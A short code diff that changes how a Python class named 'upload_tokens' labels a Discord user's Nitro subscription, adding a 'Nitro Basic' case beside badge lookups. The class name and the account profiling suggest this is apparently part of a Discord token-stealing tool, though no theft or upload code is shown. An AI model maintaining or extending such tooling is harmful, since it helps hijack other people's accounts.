@@ -220,7 +220,12 @@ class upload_tokens:
             badges = ' '.join([flag[0] for flag in self.calc_flags(user['public_flags'])])
             
             if 'premium_type' in user:
-                nitro = 'Nitro Classic' if user['premium_type'] == 1 else 'Nitro Boost'
+                if user['premium_type'] == 1:
+                    nitro = 'Nitro Classic' 
+                elif user['premium_type'] == 2:
+                    nitro = 'Nitro'
+                elif user['premium_type'] == 3:
+                    nitro = 'Nitro Basic'
             else:
                 nitro = 'None'
 
